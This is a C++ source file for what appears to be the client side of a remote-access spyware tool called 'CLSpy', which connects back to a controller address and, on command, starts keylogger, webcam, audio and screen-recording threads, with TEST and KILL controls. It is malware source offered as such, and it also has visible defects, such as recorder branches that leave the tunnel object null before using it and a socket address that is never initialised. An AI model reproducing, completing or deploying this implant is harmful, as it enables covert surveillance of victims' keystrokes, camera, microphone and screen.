#include "client.hpp"

void* helper_thread(void* __arg) {
    CLSpyTunnel* tunnel = static_cast<CLSpyTunnel*>(__arg);
    tunnel->run();
    return nullptr;
}

TunnelContainer::TunnelContainer(CommandCode __tunnel_code) {
    p_tunnel_ = nullptr;
    tunnel_code_ = __tunnel_code;
    next_ = nullptr;
}

TunnelContainer::~TunnelContainer() {
    if (p_tunnel_ != nullptr) {
        p_tunnel_->shutdown();
        delete p_tunnel_;
        if (thread_running_) {
            pthread_join(tunnel_thread_, nullptr);
        }
    }
    if (next_ != nullptr) {
        delete next_;
    }
}

// Find the tunnel by tunnel code
TunnelContainer* TunnelContainer::find(CommandCode __tunnel_code) {
    TunnelContainer* current = this;
    while (current != nullptr) {
        if (current->tunnel_code_ == __tunnel_code) {
            return current;
        }
        current = current->next_;
    }

    return nullptr;
}

Client::Client(const char* __ip, const int __port): port_(__port), socket_(-1) {
    for (int i=0; i<MAX_IP_LEN; i++) {
        ip_[i] = __ip[i];
        if (__ip[i] == '\0') {
            break;
        }
    }
    
    TunnelContainer* current = nullptr;;
    tunnel_conts_ = nullptr;

    for (int i=0;i<TUNNEL_NUMS;i++) {
        CommandCode tunnel_code = static_cast<CommandCode>(1 << i+2);
        TunnelContainer* new_tunnel = new TunnelContainer(tunnel_code);

        if (tunnel_conts_ == nullptr) {
            tunnel_conts_ = new_tunnel;
            current = tunnel_conts_;
        } else {
            current->next_ = new_tunnel;
            current = new_tunnel;
        }
    
    }


    start();
}


int Client::init() {
    memset(&server_addr_, 0, sizeof(server_addr_));
    server_addr_.sin_family = AF_INET;
    server_addr_.sin_port = htons(port_);
    if (inet_pton(AF_INET, ip_, &server_addr_.sin_addr) <= 0) {
        printf("Invalid address or address not supported\n");
        return -1;
    }

    printf("Initializing successful\n");
    return 0;
}

void Client::start() {
    uint16_t command;
    char buffer[OUT_SIZE];
    int rc;
    int error = 0;
    socklen_t len = sizeof(error);
    CommandCode command_code = 0;
    int command_arg = 0;

    while (!shutdown_flag_) {
        retry_flag_ = false;
        
        socket_ = socket(AF_INET, SOCK_STREAM, 0);
        if (socket_ < 0) {
            printf("Socket creation failed: %s\n", strerror(errno));
            goto retry;
        }

        if (connect(socket_, (struct sockaddr*)&server_addr_, sizeof(server_addr_)) < 0) {
            if (errno == ECONNREFUSED || errno == ETIMEDOUT) {
                printf("Trying to connect to the server\n");
                goto retry;
            } else {
                printf("Connection failed: %s\n", strerror(errno));
                return;
            }
        }
        
        if (getsockopt(socket_, SOL_SOCKET, SO_ERROR, &error, &len) < 0) {
            printf("Connection verification failed: %s\n", strerror(error));
            goto retry;
        }
        printf("Connected to server %s:%d\n", ip_, port_);


        while (!shutdown_flag_) {
            rc = recv(socket_, &command, sizeof(command), 0);
            if (rc < 0) {
                printf("Error receiving data: %s\n", strerror(errno));
                break;
            } else if (rc == 0) {
                printf("Server closed connection\n");
                break;
            }

            command_code = static_cast<CommandCode>(command >> 8);
            command_arg = static_cast<int>(command & 0x00FF);

            if (command_code == TEST) {
                printf("Received TEST command\n");
                rc = send_out(socket_, EXEC_SUCCESS);
                if (rc < 0) {
                    printf("Error sending data: %s\n", strerror(errno));
                    break;
                }
            } else if (command_code == KILL) {
                printf("Received KILL command\n");
                rc = send_out(socket_, EXEC_SUCCESS);
                if (rc < 0) {
                    printf("Error sending data: %s\n", strerror(errno));
                    break;
                }
                shutdown_flag_ = true;
                break;
            } else {
                TunnelContainer* tunnel_cont = tunnel_conts_->find(command_code);
                CLSpyTunnel* tunnel = tunnel_cont->p_tunnel_;

                if (command_arg>0) {
                    if (tunnel != nullptr) { // Tunnel is already running
                        printf("Tunnel already running\n");
                        rc = send_out(socket_, EXEC_ERROR);
                        if (rc < 0) {
                            printf("Error sending data: %s\n", strerror(errno));
                            break;
                        }
                        continue;
                    }

                    // Start the tunnel
                    if (command_code == KEYLOGGER) {
                        printf("Received KEYLOGGER command\n");
                        tunnel = new CLKeylogger();
                    } else if (command_code == WEBCAM_RECORDER) {
                        printf("Received WEBCAM_RECORDER command\n");
                    } else if (command_code == AUDIO_RECORDER) {
                        printf("Received AUDIO_RECORDER command\n");
                    } else if (command_code == SCREEN_RECORDER) {
                        printf("Received SCREEN_RECORDER command\n");
                    } else {
                        printf("Unknown command: %d\n", command_code);
                        rc = send_out(socket_, EXEC_ERROR);
                        if (rc < 0) {
                            printf("Error sending data: %s\n", strerror(errno));
                            break;
                        }
                        continue;
                    }
                    tunnel->init(ip_, port_, &shutdown_flag_);
                    if (pthread_create(&tunnel_cont->tunnel_thread_, nullptr, helper_thread, tunnel) != 0) {
                        printf("Error creating tunnel thread\n");
                        delete tunnel;
                        tunnel = nullptr;
                        rc = send_out(socket_, EXEC_ERROR);
                        if (rc < 0) {
                            printf("Error sending data: %s\n", strerror(errno));
                            break;
                        }
                    } else {
                        printf("Tunnel started\n");
                        tunnel_cont->thread_running_ = true;
                        rc = send_out(socket_, EXEC_SUCCESS);
                        if (rc < 0) {
                            printf("Error sending data: %s\n", strerror(errno));
                            break;
                        }
                    }
                } else {
                    if (tunnel == nullptr) { // Tunnel is already not running
                        printf("Tunnel not running\n");
                        rc = send_out(socket_, EXEC_ERROR);
                        if (rc < 0) {
                            printf("Error sending data: %s\n", strerror(errno));
                            break;
                        }
                        continue;
                    }

                    // Stop the tunnel
                    tunnel->shutdown();
                    if (tunnel_cont->thread_running_) {
                        pthread_join(tunnel_cont->tunnel_thread_, nullptr);
                        tunnel_cont->thread_running_ = false;
                    }
                    rc = send_out(socket_, EXEC_SUCCESS);
                    if (rc < 0) {
                        printf("Error sending data: %s\n", strerror(errno));
                        break;
                    }
                }
            }

        }
        retry:
            if (!shutdown_flag_) {
                sleep(1);
                if (socket_ >= 0) {
                    close(socket_);
                }
                continue;
            }
    }
}

void Client::shutdown() {
    printf("Shutting down client\n");
    close(socket_);
    delete tunnel_conts_;
}